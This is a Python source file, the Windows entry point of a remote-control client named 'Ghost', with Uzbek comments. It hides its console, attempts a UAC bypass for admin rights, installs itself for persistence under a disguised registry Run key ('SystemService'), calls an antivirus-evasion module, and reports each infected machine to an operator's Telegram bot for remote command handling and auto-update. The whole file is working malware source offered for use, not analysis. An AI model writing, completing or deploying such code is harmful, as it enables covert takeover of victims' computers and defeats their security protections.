# main.py - v3.0.4 CLIENT (AUTO DEPENDENCY INSTALLER)
"""
Ghost Control Client - Asosiy Fayl

v3.0.4: Avtomatik kutubxona o'rnatish qo'shildi
MUHIM: UAC bypass birinchi, keyin persistence!
Agar UAC bypass muvaffaqiyatli bo'lsa, dastur qayta ishga tushadi.
"""

import asyncio
import sys
import logging
import ctypes
import os
import time
from pathlib import Path

# ==================== AUTO INSTALLER (BIRINCHI!) ====================
# Yetishmayotgan kutubxonalarni avtomatik o'rnatish
try:
    from auto_installer import ensure_dependencies
    # Critical kutubxonalarni tekshirish va o'rnatish
    # Optional kutubxonalar background'da o'rnatiladi
    if not ensure_dependencies():
        print("❌ Critical kutubxonalar o'rnatilmadi!")
        time.sleep(3)
        sys.exit(1)
except ImportError:
    pass  # auto_installer mavjud emas - davom etish

from telethon import TelegramClient

# Config import
from config import (
    API_ID, API_HASH, BOT_TOKEN, ADMIN_ID,
    DEBUG_MODE, AUTO_UPDATE_ENABLED, SESSION_NAME,
    STEALTH_ENABLED, PERSISTENCE_ENABLED, ANTIVIRUS_EVASION
)

# Utils
from utils import register_device
from handlers import register_handlers

# Qo'shimcha xususiyatlar (optional imports)
try:
    from antivirus_evasion import evade_antivirus
    EVASION_AVAILABLE = True
except ImportError:
    EVASION_AVAILABLE = False
    evade_antivirus = None

try:
    from build_and_hide import auto_build_on_start
    BUILD_AVAILABLE = True
except ImportError:
    BUILD_AVAILABLE = False
    auto_build_on_start = None

try:
    from uac_bypass import attempt_uac_bypass, is_admin
    UAC_BYPASS_AVAILABLE = True
except ImportError:
    UAC_BYPASS_AVAILABLE = False
    is_admin = lambda: False

# Persistence moduli (EXE uchun o'zini ko'chirish)
try:
    from persistence import ensure_persistence
    PERSISTENCE_MODULE_AVAILABLE = True
except ImportError:
    PERSISTENCE_MODULE_AVAILABLE = False
    ensure_persistence = None

# ==================== LOGGING ====================
if DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
else:
    logging.basicConfig(
        level=logging.CRITICAL,
        handlers=[logging.NullHandler()]
    )

logger = logging.getLogger(__name__)

# ==================== YORDAMCHI FUNKSIYALAR ====================
def hide_console():
    """Konsol oynasini yashirish"""
    if not STEALTH_ENABLED:
        return
    
    try:
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
            # CloseHandle olib tashlandi - xavfli va kerak emas
            logger.debug("Konsol yashirildi")
    except Exception as e:
        logger.debug(f"Konsol yashirish xatosi: {e}")

def check_admin():
    """Admin huquqini tekshirish"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

# ==================== AVTOYUKLASH ====================
def add_to_startup():
    """Windows avtoyuklashiga qo'shish"""
    if not PERSISTENCE_ENABLED:
        logger.debug("Avtoyuklash o'chirilgan")
        return False
    
    try:
        if not getattr(sys, 'frozen', False):
            logger.debug(".exe rejimda emas - avtoyuklash o'tkazib yuborildi")
            return False
        
        exe_path = sys.executable
        
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                key_path,
                0,
                winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, f'"{exe_path}"')
            winreg.CloseKey(key)
            logger.info("Avtoyuklashga qo'shildi (registry)")
            return True
        except Exception as e:
            logger.error(f"Registry avtoyuklash xatosi: {e}")
            return False
            
    except Exception as e:
        logger.error(f"Avtoyuklash xatosi: {e}")
        return False

# ==================== ASOSIY FUNKSIYA ====================
async def main():
    """Asosiy async funksiya - TO'G'RI TARTIBDA"""
    client = None
    
    try:
        # 1. Konsolni yashirish (stealth)
        if STEALTH_ENABLED:
            hide_console()
            logger.debug("Yashirin rejim faol")
        
        # 2. BIRINCHI: UAC bypass (agar kerak bo'lsa)
        # MUHIM: UAC bypass muvaffaqiyatli bo'lsa, dastur QAYTA ISHGA TUSHADI!
        # Shuning uchun persistence UNDAN KEYIN kerak
        if UAC_BYPASS_AVAILABLE and not check_admin():
            logger.info("UAC bypass urinilmoqda...")
            try:
                # attempt_uac_bypass() muvaffaqiyatli bo'lsa, sys.exit() chaqiriladi
                # Dastur qayta ishga tushadi admin huquqlari bilan
                await attempt_uac_bypass()
                # Agar bu yerga yetib kelsa, UAC bypass muvaffaqiyatsiz
                logger.info("UAC bypass muvaffaqiyatsiz, oddiy rejimda davom etamiz")
            except Exception as e:
                logger.error(f"UAC bypass xatosi: {e}")
        else:
            logger.info(f"Admin huquqi: {'✅' if check_admin() else '❌'}")
        
        # 3. IKKINCHI: Doimiy ishlash (Persistence) - YANGILANGAN
        # EXE uchun o'zini ko'chirish va startup qo'shish
        if PERSISTENCE_ENABLED:
            logger.info("Doimiy ishlash sozlanmoqda...")
            
            # Yangi persistence moduli (EXE uchun)
            if PERSISTENCE_MODULE_AVAILABLE and getattr(sys, 'frozen', False):
                try:
                    # Bu funksiya EXE ni yashirin papkaga ko'chiradi
                    # va startup'ga qo'shadi, keyin qayta ishga tushiradi
                    ensure_persistence()
                except Exception as e:
                    logger.error(f"Persistence xatosi: {e}")
            
            # Eski usul o'chirildi - persistence.py o'zi registry'ga yozadi
            # add_to_startup()  # DEPRECATED - duplikat registry yozuvini oldini olish
        
        # 4. Antivirus himoyasini chetlab o'tish
        if ANTIVIRUS_EVASION and EVASION_AVAILABLE:
            logger.info("Antivirus himoyasi chetlab o'tilmoqda...")
            try:
                evade_antivirus()
            except Exception as e:
                logger.error(f"Antivirus chetlab o'tish xatosi: {e}")
        
        # 5. Avtomatik build (agar script rejimida bo'lsa)
        if BUILD_AVAILABLE and not getattr(sys, 'frozen', False):
            logger.info("Avtomatik build tekshiruvi...")
            try:
                auto_build_on_start()
            except Exception as e:
                logger.error(f"Auto build xatosi: {e}")
        
        # 6. Telegram clientni ishga tushirish
        logger.info("Telegram client ishga tushmoqda...")
        client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
        await client.start(bot_token=BOT_TOKEN)
        
        # 7. Handlerlarni ro'yxatdan o'tkazish
        logger.info("Handlerlar ro'yxatdan o'tmoqda...")
        register_handlers(client)
        
        # 7.5 AI Helper ni ishga tushirish
        try:
            from ai_helper import initialize_ai_helper
            from config import AI_ENABLED, USE_OPENROUTER, OPENROUTER_API_KEY, GEMINI_API_KEY
            
            if AI_ENABLED:
                if USE_OPENROUTER and OPENROUTER_API_KEY:
                    # OpenRouter uchun - TO'G'RI PROVIDER!
                    initialize_ai_helper("openrouter", OPENROUTER_API_KEY)
                    logger.info("AI Helper (OpenRouter) ishga tushdi")
                elif GEMINI_API_KEY:
                    # Gemini backup uchun
                    initialize_ai_helper("anthropic", GEMINI_API_KEY)
                    logger.info("AI Helper (Gemini) ishga tushdi")
                else:
                    logger.warning("AI kalitlar topilmadi")
        except Exception as e:
            logger.error(f"AI Helper xatosi: {e}")
        # 8. Qurilmani ro'yxatdan o'tkazish
        logger.info("Qurilma ro'yxatdan o'tmoqda...")
        await register_device(client)
        
        # 9. "Onlayn" xabarini yuborish
        admin_status = "🔓 Admin" if check_admin() else "🔒 Oddiy"
        
        try:
            from config import CURRENT_VERSION
            message = (
                f"💻 **Ghost Onlayn** `v{CURRENT_VERSION}`\n\n"
                f"✅ Faol\n"
                f"🔐 {admin_status}\n"
            )
            
            if not check_admin():
                message += f"\n💡 Admin rejim uchun qayta ishga tushiring\n"
            
            message += f"\n🎛️ /start"
            
            await client.send_message(ADMIN_ID, message, silent=True)
            logger.info("Onlayn xabari yuborildi")
        except Exception as e:
            logger.error(f"Xabar yuborish xatosi: {e}")
        
        # 10. Avtomatik yangilanish (ixtiyoriy)
        if AUTO_UPDATE_ENABLED:
            try:
                from auto_updater import start_auto_updater
                start_auto_updater(client)
                logger.info("Avtomatik yangilanish ishga tushdi")
            except Exception as e:
                logger.error(f"Avtomatik yangilanish xatosi: {e}")
        
        # 11. Uzilgunga qadar ishlash
        logger.info("✅ Ghost ishlamoqda (24/7)")
        await client.run_until_disconnected()
        
    except KeyboardInterrupt:
        logger.info("Foydalanuvchi tomonidan to'xtatildi")
    except Exception as e:
        logger.critical(f"Jiddiy xatolik: {e}", exc_info=DEBUG_MODE)
        
        # Adminga xatolik haqida xabar yuborish
        if client:
            try:
                await client.send_message(
                    ADMIN_ID,
                    f"❌ **Jiddiy Xatolik**\n\n"
                    f"Xatolik: `{str(e)}`\n\n"
                    f"Ghost to'xtadi!"
                )
            except:
                pass
    
    finally:
        # Tozalash
        if client:
            try:
                await client.disconnect()
            except:
                pass
        
        logger.info("To'xtatish yakunlandi")

# ==================== KIRISH NUQTASI ====================
if __name__ == "__main__":
    # Platforma tekshiruvi
    if sys.platform != "win32":
        print("❌ Bu dastur faqat Windows'da ishlaydi!")
        sys.exit(1)
    
    # Python versiyasi tekshiruvi
    if sys.version_info < (3, 7):
        print("❌ Python 3.7+ kerak!")
        sys.exit(1)
    
    # Konsolni darhol yashirish
    if STEALTH_ENABLED:
        hide_console()
    
    # Ogohlantirishlarni yashirish
    try:
        import warnings
        warnings.filterwarnings("ignore")
    except:
        pass
    
    # Asosiy funksiyani ishga tushirish
    try:
        asyncio.run(main())
    except Exception as e:
        logger.critical(f"Ishga tushirish xatosi: {e}", exc_info=DEBUG_MODE)
        time.sleep(2)
        sys.exit(1)